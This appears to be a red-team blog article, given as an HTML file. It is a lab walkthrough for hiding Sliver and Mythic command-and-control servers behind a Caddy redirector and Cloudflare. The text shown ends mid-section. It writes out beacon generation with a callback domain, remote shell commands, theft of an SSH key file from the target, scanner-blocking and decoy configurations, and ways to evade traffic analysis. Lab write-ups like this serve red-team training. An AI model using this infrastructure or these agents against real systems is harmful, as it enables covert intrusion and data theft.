@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <title>C2 Network Redirection & Traffic Filtering Lab | 0x1Ak4sh</title>
+    <meta name="description" content="Deploying Sliver and Mythic C2 frameworks with Caddy reverse proxy and Cloudflare traffic filtering. Infrastructure setup, agent generation, and traffic analysis.">
+    <meta name="robots" content="index,follow">
+    <link rel="canonical" href="https://mrakashkumar.in/articles/c2-deployment/">
+
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://mrakashkumar.in/articles/c2-deployment/">
+    <meta property="og:title" content="C2 Network Redirection & Traffic Filtering Lab">
+    <meta property="og:description" content="Deploying Sliver and Mythic C2 frameworks with Caddy reverse proxy and Cloudflare traffic filtering.">
+    <meta property="og:image" content="https://mrakashkumar.in/articles/c2-deployment/assets/Deploy%20C2%20Network.png">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="C2 Network Redirection & Traffic Filtering Lab | 0x1Ak4sh">
+    <meta name="twitter:description" content="Deploying Sliver and Mythic C2 frameworks with Caddy reverse proxy and Cloudflare traffic filtering.">
+    <meta name="twitter:image" content="https://mrakashkumar.in/articles/c2-deployment/assets/Deploy%20C2%20Network.png">
+
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/8d67cb621b.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="/css/article.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css">
+
+    <style>
+        .article-content figure { text-align: center; }
+        .article-content figure img {
+            display: inline-block; margin: 0 auto;
+            max-height: 700px; width: auto; max-width: 100%;
+        }
+        .article-content figure a.image-popup { display: inline-block; }
+    </style>
+</head>
+
+<body class="article-page">
+
+    <div class="reading-progress"></div>
+
+    <div id="canvas_snake" class="canvas canvas-snake" data-colorone="#0b1115" data-colortwo="#ff6b35"
+        style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.25;"></div>
+
+    <nav class="article-nav">
+        <div class="nav-left">
+            <a href="/" class="nav-back"><i class="fas fa-arrow-left"></i><span>Back</span></a>
+            <a href="/" class="nav-logo">0x1Ak4sh</a>
+        </div>
+        <div class="nav-right">
+            <button class="nav-share-btn" onclick="document.querySelector('.share-section').scrollIntoView({behavior:'smooth'})" title="Share">
+                <i class="fas fa-share-alt"></i>
+            </button>
+        </div>
+    </nav>
+
+    <section class="article-hero">
+        <div class="hero-bg" style="background-image: url('/articles/c2-deployment/assets/Deploy%20C2%20Network.png'); background-color: #0d1117;"></div>
+        <div class="hero-content">
+            <div class="hero-badges">
+                <span class="badge badge-category"><i class="fas fa-skull"></i> C2 Infrastructure</span>
+                <span class="badge badge-difficulty medium"><i class="fas fa-cogs"></i> Red Team</span>
+            </div>
+            <h1 class="hero-title">C2 Network Redirection & Traffic Filtering Lab</h1>
+            <p style="color: rgba(255,255,255,0.7); font-size: 1.05rem; margin: 0.5rem 0 1rem; max-width: 680px;">
+                Deploying Sliver and Mythic C2 frameworks behind a Caddy reverse proxy and Cloudflare edge.
+                Covers infrastructure provisioning, agent generation, advanced traffic filtering, and network traffic analysis.
+            </p>
+
+            <div class="project-stats">
+                <div class="stat-item"><i class="fas fa-cloud"></i> Oracle Cloud VPS</div>
+                <div class="stat-item"><i class="fas fa-shield-halved"></i> Cloudflare Proxy</div>
+                <div class="stat-item"><i class="fas fa-arrows-split"></i> Caddy Redirector</div>
+                <div class="stat-item"><i class="fas fa-bolt"></i> Sliver + Mythic</div>
+            </div>
+
+            <div class="hero-tags">
+                <a href="#" class="hero-tag">#c2</a>
+                <a href="#" class="hero-tag">#sliver</a>
+                <a href="#" class="hero-tag">#mythic</a>
+                <a href="#" class="hero-tag">#caddy</a>
+                <a href="#" class="hero-tag">#cloudflare</a>
+                <a href="#" class="hero-tag">#redteam</a>
+            </div>
+        </div>
+    </section>
+
+    <main class="article-layout" style="position:relative;z-index:1;">
+
+        <aside class="toc-sidebar">
+            <div class="toc-title">Contents</div>
+            <ul class="toc-list">
+                <li><a href="#infrastructure">1. Infrastructure Provisioning</a></li>
+                <li><a href="#dns-cloudflare">2. DNS and Edge Proxying</a></li>
+                <li><a href="#sliver-install">3. Sliver C2 Installation</a></li>
+                <li><a href="#caddy-basic">4. Initial Caddy Redirection</a></li>
+                <li><a href="#agent-interaction">5. Agent Generation & Core Interaction</a></li>
+                <li><a href="#caddy-advanced">6. Advanced Filtering & Decoy</a></li>
+                <li><a href="#wireshark">7. Traffic Analysis</a></li>
+                <li><a href="#data-retrieval">8. Data Retrieval Simulation</a></li>
+                <li><a href="#mythic-setup">9. Mythic C2 Setup</a></li>
+                <li><a href="#mythic-port-forward">10. Management Console</a></li>
+                <li><a href="#mythic-containers">11. Container & Agent Setup</a></li>
+                <li><a href="#mythic-payload">12. Payload Creation</a></li>
+                <li><a href="#mythic-interaction">13. Payload Execution & Interaction</a></li>
+                <li><a href="#decoy">14. Traffic Inspection & Decoy</a></li>
+            </ul>
+        </aside>
+
+        <article class="article-content">
+
+            <p>
+                This article walks through deploying and configuring a Command and Control (C2) network redirection
+                and traffic filtering infrastructure. The goal is to host a C2 listener behind a reverse proxy (Caddy)
+                and Cloudflare, filter out unauthorized scanners, redirect baseline traffic to a decoy site, and
+                allow target communications to reach the internal handler.
+            </p>
+
+            <p>
+                All systems targeted in this lab are my own — this is a controlled environment for education and practice.
+            </p>
+
+            <!-- ============================================================ -->
+            <!-- 1. INFRASTRUCTURE PROVISIONING                                -->
+            <!-- ============================================================ -->
+            <h2 id="infrastructure">1. Infrastructure Provisioning (Oracle Cloud)</h2>
+
+            <p>
+                The first step is setting up a VPS to host the C2 server and reverse proxy.
+            </p>
+
+            <ul>
+                <li><strong>OS:</strong> Ubuntu 24.04 LTS</li>
+                <li><strong>Shape:</strong> VM.Standard.E5.Flex — 4 OCPUs, 32 GB RAM, 4 Gbps network</li>
+            </ul>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260528074614.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260528074614.png" alt="Oracle VM Configuration">
+                </a>
+                <figcaption>Oracle VM configuration — Ubuntu 24.04 with 4 OCPUs and 32 GB RAM.</figcaption>
+            </figure>
+
+            <h3>Network Firewall Rules</h3>
+            <p>
+                The Oracle Cloud Security List was configured with stateful ingress rules allowing:
+                <strong>TCP 22</strong> (SSH), <strong>TCP 80</strong> (HTTP challenge), <strong>TCP 443</strong> (HTTPS traffic).
+            </p>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260531081329.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260531081329.png" alt="Oracle Security List">
+                </a>
+                <figcaption>Oracle Security List ingress rules for management and C2 traffic.</figcaption>
+            </figure>
+
+            <!-- ============================================================ -->
+            <!-- 2. DNS AND EDGE PROXYING                                      -->
+            <!-- ============================================================ -->
+            <h2 id="dns-cloudflare">2. DNS and Edge Proxying (Cloudflare)</h2>
+
+            <p>
+                To hide the VPS's true IP, the subdomain <code>cdn.apex-corp.xyz</code> was pointed to the public IP
+                using an A record with Cloudflare proxying enabled.
+            </p>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260531074430.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260531074430.png" alt="Cloudflare DNS Setup">
+                </a>
+                <figcaption>Cloudflare A record with proxy enabled to obfuscate the backend IP.</figcaption>
+            </figure>
+
+            <!-- ============================================================ -->
+            <!-- 3. SLIVER C2 INSTALLATION                                     -->
+            <!-- ============================================================ -->
+            <h2 id="sliver-install">3. Sliver C2 Server Installation</h2>
+
+            <p>Sliver C2 server (v1.7.3) is installed and launched on the VPS.</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> sliver</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260531073256.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260531073256.png" alt="Sliver C2 Server Console">
+                </a>
+                <figcaption>Sliver C2 server console banner after launch.</figcaption>
+            </figure>
+
+            <!-- ============================================================ -->
+            <!-- 4. INITIAL CADDY REDIRECTION                                   -->
+            <!-- ============================================================ -->
+            <h2 id="caddy-basic">4. Initial Edge Redirection Setup (Caddy)</h2>
+
+            <p>
+                Caddy Server acts as a reverse proxy, handling SSL and filtering traffic based on incoming request properties.
+            </p>
+
+            <h3>Installation</h3>
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> sudo apt update && sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https</code>
+                    <code><span class="prompt">$</span> curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg</code>
+                    <code><span class="prompt">$</span> curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/caddy-stable.list</code>
+                    <code><span class="prompt">$</span> sudo apt update && sudo apt install caddy</code>
+                </div>
+            </div>
+
+            <h3>Basic Caddyfile</h3>
+            <p>
+                The initial configuration intercepts HTTPS requests to <code>cdn.apex-corp.xyz</code>, validates
+                TLS internally, and proxies matching traffic to Sliver's local port. Non-matching traffic gets
+                redirected to an external domain.
+            </p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-file-code"></i> /etc/caddy/Caddyfile</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> {</code>
+                    <code>    auto_https off</code>
+                    <code>}</code>
+                    <code></code>
+                    <code><span class="prompt">$</span> https://cdn.apex-corp.xyz:443 {</code>
+                    <code>    tls internal</code>
+                    <code>    @legit_c2 {</code>
+                    <code>        header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"</code>
+                    <code>        path /api/v1/data</code>
+                    <code>    }</code>
+                    <code>    reverse_proxy @legit_c2 https://127.0.0.1:443 {</code>
+                    <code>        transport http { tls_insecure_skip_verify }</code>
+                    <code>    }</code>
+                    <code>    redir https://aws.amazon.com/cloudfront/ 302</code>
+                    <code>}</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260531080818.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260531080818.png" alt="Basic Caddyfile">
+                </a>
+                <figcaption>Basic Caddyfile — routes C2 traffic to Sliver, redirects everything else.</figcaption>
+            </figure>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> caddy validate --config /etc/caddy/Caddyfile</code>
+                    <code><span class="prompt">$</span> sudo systemctl reload caddy</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260531080952.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260531080952.png" alt="Caddy Validation">
+                </a>
+                <figcaption>Validation and reload — config is valid and applied.</figcaption>
+            </figure>
+
+            <!-- ============================================================ -->
+            <!-- 5. AGENT GENERATION & INTERACTION                              -->
+            <!-- ============================================================ -->
+            <h2 id="agent-interaction">5. Agent Generation and Core Interaction</h2>
+
+            <h3>Generating the First-Stage Beacon</h3>
+            <p>A Sliver beacon is generated with HTTP callback through the Cloudflare proxy.</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Sliver Console</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">sliver></span> generate beacon --http http://cdn.apex-corp.xyz --seconds 10 --jitter 3 --os windows --save /tmp/beaco1n.exe</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Deploy%20C2%20Network.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Deploy%20C2%20Network.png" alt="Sliver Generate Beacon">
+                </a>
+                <figcaption>Generating the first-stage beacon targeting cdn.apex-corp.xyz.</figcaption>
+            </figure>
+
+            <h3>Listener and Initial Callback</h3>
+            <p>An HTTP listener is started on port 8080. The beacon executes on the target (<strong>STARK-TOWER</strong>) and checks in as agent <code>ANNOYED_PANTHER</code> under <code>HQ\Administrator</code>.</p>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260531132303.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260531132303.png" alt="Active Jobs and Callback">
+                </a>
+                <figcaption>Active jobs and initial callback from STARK-TOWER.</figcaption>
+            </figure>
+
+            <h3>Running Host Tasks</h3>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Sliver Console</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">sliver></span> screenshot</code>
+                    <code><span class="prompt">sliver></span> execute notepad.exe</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260531132316.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260531132316.png" alt="Host Tasks">
+                </a>
+                <figcaption>Executing screenshot and notepad tasks on the target.</figcaption>
+            </figure>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260531132343.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260531132343.png" alt="Target Screenshot">
+                </a>
+                <figcaption>Target desktop — notepad.exe running alongside the beacon.</figcaption>
+            </figure>
+
+            <h3>Interactive Shell Session</h3>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Sliver Console</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">sliver></span> interactive</code>
+                    <code><span class="prompt">sliver></span> sessions</code>
+                    <code><span class="prompt">sliver></span> use b4f8edb8</code>
+                    <code><span class="prompt">sliver></span> ls</code>
+                    <code><span class="prompt">sliver></span> whoami</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260531132445.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260531132445.png" alt="Interactive Session">
+                </a>
+                <figcaption>Interactive session confirming admin context on STARK-TOWER.</figcaption>
+            </figure>
+
+            <!-- ============================================================ -->
+            <!-- 6. ADVANCED FILTERING                                          -->
+            <!-- ============================================================ -->
+            <h2 id="caddy-advanced">6. Advanced Edge Filtering and Decoy Hosting</h2>
+
+            <p>
+                To harden against scanning tools, a more complex Caddy configuration is deployed. It blocks
+                common scanner user-agents (nmap, sqlmap, nikto, curl, wget, etc.), forwards validated C2 traffic
+                to Sliver on port 8081, and serves a decoy static site for everything else.
+            </p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-file-code"></i> /etc/caddy/Caddyfile</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>cdn.apex-corp.xyz {</code>
+                    <code>    @scanner_ua {</code>
+                    <code>        header User-Agent *curl*</code>
+                    <code>        header User-Agent *wget*</code>
+                    <code>        header User-Agent *python-requests*</code>
+                    <code>        header User-Agent *nikto*</code>
+                    <code>        header User-Agent *nmap*</code>
+                    <code>        header User-Agent *sqlmap*</code>
+                    <code>        header User-Agent *massscan*</code>
+                    <code>        header User-Agent *zgrab*</code>
+                    <code>        header User-Agent *nessus*</code>
+                    <code>    }</code>
+                    <code>    abort @scanner_ua</code>
+                    <code></code>
+                    <code>    @legitc2 expression `{path}.startsWith(\"/api/v1/data\") || {header.User-Agent} == \"Mozilla/5.0...\"`</code>
+                    <code>    handle @legitc2 {</code>
+                    <code>        reverse_proxy 127.0.0.1:8081</code>
+                    <code>    }</code>
+                    <code></code>
+                    <code>    handle {</code>
+                    <code>        root * /var/www/html/decoy</code>
+                    <code>        file_server { hide .git .env *.py *.key }</code>
+                    <code>    }</code>
+                    <code>}</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601000720.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601000720.png" alt="Advanced Caddyfile">
+                </a>
+                <figcaption>Advanced Caddyfile with scanner blocking, C2 routing, and decoy file server.</figcaption>
+            </figure>
+
+            <p>Sliver is bound locally on port 8081 so traffic can only reach it via Caddy:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Sliver Console</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">sliver></span> http -L 127.0.0.1 -l 8081</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601014427.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601014427.png" alt="Localhost Listener">
+                </a>
+                <figcaption>Localhost-bound HTTP listener on port 8081.</figcaption>
+            </figure>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601023852.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601023852.png" alt="Second Stage Callback">
+                </a>
+                <figcaption>Second-stage beacon check-in through the hardened proxy.</figcaption>
+            </figure>
+
+            <!-- ============================================================ -->
+            <!-- 7. TRAFFIC ANALYSIS                                           -->
+            <!-- ============================================================ -->
+            <h2 id="wireshark">7. C2 Traffic Analysis (Wireshark)</h2>
+
+            <p>
+                Wireshark captures show standard HTTP POST requests routing to URLs disguised as active script
+                elements (e.g., <code>/javascripts/javascripts/script/scripts?g=...</code>).
+            </p>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601024005.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601024005.png" alt="Wireshark HTTP Stream">
+                </a>
+                <figcaption>Wireshark HTTP stream follow — C2 traffic disguised as script requests.</figcaption>
+            </figure>
+
+            <p>
+                Sliver uses a dictionary-based steganographic encoder that converts encrypted commands into strings
+                of common dictionary words, bypassing automated network heuristic analyzers.
+            </p>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601024310.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601024310.png" alt="Packet Hex Detail">
+                </a>
+                <figcaption>Hex dump showing obfuscated payload strings using word-based encoding.</figcaption>
+            </figure>
+
+            <!-- ============================================================ -->
+            <!-- 8. DATA RETRIEVAL                                              -->
+            <!-- ============================================================ -->
+            <h2 id="data-retrieval">8. Data Retrieval Simulation</h2>
+
+            <p>A file retrieval command tests secure transfer over the redirection chain.</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Sliver Console</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">sliver></span> download ssh.key.txt</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601024313.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601024313.png" alt="Download SSH Key">
+                </a>
+                <figcaption>File transfer completing through the Cloudflare-Caddy chain.</figcaption>
+            </figure>
+
+            <!-- ============================================================ -->
+            <!-- 9. MYTHIC C2 SETUP                                            -->
+            <!-- ============================================================ -->
+            <h2 id="mythic-setup">9. Mythic C2 Setup & Installation</h2>
+
+            <p>
+                Mythic is a containerized C2 framework using Docker for its control server, databases,
+                scripting environments, and agent containers.
+            </p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> git clone https://github.com/its-a-feature/Mythic.git</code>
+                    <code><span class="prompt">$</span> cd Mythic</code>
+                    <code><span class="prompt">$</span> sudo ./mythic-cli start</code>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- 10. MANAGEMENT CONSOLE                                        -->
+            <!-- ============================================================ -->
+            <h2 id="mythic-port-forward">10. Management Console Port Forwarding</h2>
+
+            <p>
+                Mythic's web console binds to localhost on port 7443. SSH local port forwarding is used to access it:
+            </p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> PowerShell (Local)</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> ssh -L 7443:127.0.0.1:7443 ubuntu@79.72.43.55 -i .\ssh.key</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601030430.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601030430.png" alt="SSH Tunnel">
+                </a>
+                <figcaption>Establishing SSH tunnel for Mythic management console access.</figcaption>
+            </figure>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601030635.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601030635.png" alt="Mythic Login">
+                </a>
+                <figcaption>Mythic console login — accessible via localhost:7443 through the tunnel.</figcaption>
+            </figure>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal (VPS)</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> sudo ./mythic-cli config get MYTHIC_ADMIN_PASSWORD</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601030658.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601030658.png" alt="Mythic Password">
+                </a>
+                <figcaption>Retrieving the auto-generated admin password via mythic-cli.</figcaption>
+            </figure>
+
+            <!-- ============================================================ -->
+            <!-- 11. CONTAINERS & AGENTS                                        -->
+            <!-- ============================================================ -->
+            <h2 id="mythic-containers">11. Initializing Containers & Installing Agents</h2>
+
+            <p>
+                Mythic initializes its core stack: PostgreSQL, RabbitMQ, React portal, GraphQL API, Nginx,
+                Jupyter, documentation server, and the Apollo agent.
+            </p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal (VPS)</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> sudo ./mythic-cli install github https://github.com/MythicAgents/thanatos</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601031049.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601031049.png" alt="Mythic Containers">
+                </a>
+                <figcaption>Mythic container stack launching — all core services initialized.</figcaption>
+            </figure>
+
+            <!-- ============================================================ -->
+            <!-- 12. PAYLOAD CREATION                                          -->
+            <!-- ============================================================ -->
+            <h2 id="mythic-payload">12. Payload Creation (Apollo Agent)</h2>
+
+            <p>Using the web-based payload wizard, a Windows-compatible agent is compiled.</p>
+
+            <h3>Step 1: OS & Agent Type</h3>
+            <p>Windows target, Apollo payload type (v2.4.15 — .NET 4.0 compatible).</p>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601031307.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601031307.png" alt="Payload OS Selection">
+                </a>
+                <figcaption>Selecting Windows as target OS and Apollo as payload type.</figcaption>
+            </figure>
+
+            <h3>Step 2: Configure Commands</h3>
+            <p>Standard administration functions: download, exit, ps, run, shell, load.</p>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601031340.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601031340.png" alt="Agent Commands">
+                </a>
+                <figcaption>Selecting bundled commands for the compiled agent.</figcaption>
+            </figure>
+
+            <h3>Step 3: C2 Profile & Callback Host</h3>
+            <p>HTTP C2 profile with callback host pointing to <code>https://cdn.apex-corp.xyz</code>.</p>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601031606.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601031606.png" alt="C2 Profile">
+                </a>
+                <figcaption>Selecting the HTTP C2 profile for transport.</figcaption>
+            </figure>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601031638.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601031638.png" alt="Callback Host">
+                </a>
+                <figcaption>Setting the callback host to the Cloudflare-proxied domain.</figcaption>
+            </figure>
+
+            <!-- ============================================================ -->
+            <!-- 13. PAYLOAD EXECUTION & INTERACTION                            -->
+            <!-- ============================================================ -->
+            <h2 id="mythic-interaction">13. Payload Execution & Core Interaction</h2>
+
+            <p>
+                The compiled payload runs on <strong>STARK-TOWER</strong>. An active session is established
+                (Interact ID: 1) with target details:
+            </p>
+            <ul>
+                <li><strong>IP:</strong> 10.10.0.1</li>
+                <li><strong>Host:</strong> STARK-TOWER</li>
+                <li><strong>User:</strong> Administrator</li>
+                <li><strong>Domain:</strong> HQ</li>
+                <li><strong>PID:</strong> 2620</li>
+            </ul>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601034424.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601034424.png" alt="Active Target">
+                </a>
+                <figcaption>Active callback — target system details in the Mythic console.</figcaption>
+            </figure>
+
+            <h3>Host Reconnaissance</h3>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Apollo Console</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">apollo></span> ifconfig</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601034516.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601034516.png" alt="ifconfig">
+                </a>
+                <figcaption>ifconfig output showing WireGuard tunnel and network interfaces.</figcaption>
+            </figure>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Apollo Console</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">apollo></span> shell whoami</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601034736.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601034736.png" alt="whoami">
+                </a>
+                <figcaption>Domain admin context confirmed via shell whoami.</figcaption>
+            </figure>
+
+            <!-- ============================================================ -->
+            <!-- 14. TRAFFIC INSPECTION & DECOY                                 -->
+            <!-- ============================================================ -->
+            <h2 id="decoy">14. Network Traffic Inspection & Decoy Verification</h2>
+
+            <h3>Mythic Wireshark Analysis</h3>
+            <p>
+                HTTP POST requests sent to <code>/api/v1/data/javascripts/bundles/javascripts/app.php</code>
+                on <code>cdn.apex-corp.xyz</code> with a standard Chrome User-Agent. Cloudflare handles
+                redirection with a 308 redirect from HTTP to HTTPS.
+            </p>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601034615.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601034615.png" alt="Mythic Wireshark">
+                </a>
+                <figcaption>Wireshark analysis of Mythic C2 traffic through the proxy chain.</figcaption>
+            </figure>
+
+            <h3>Decoy Site Validation</h3>
+            <p>
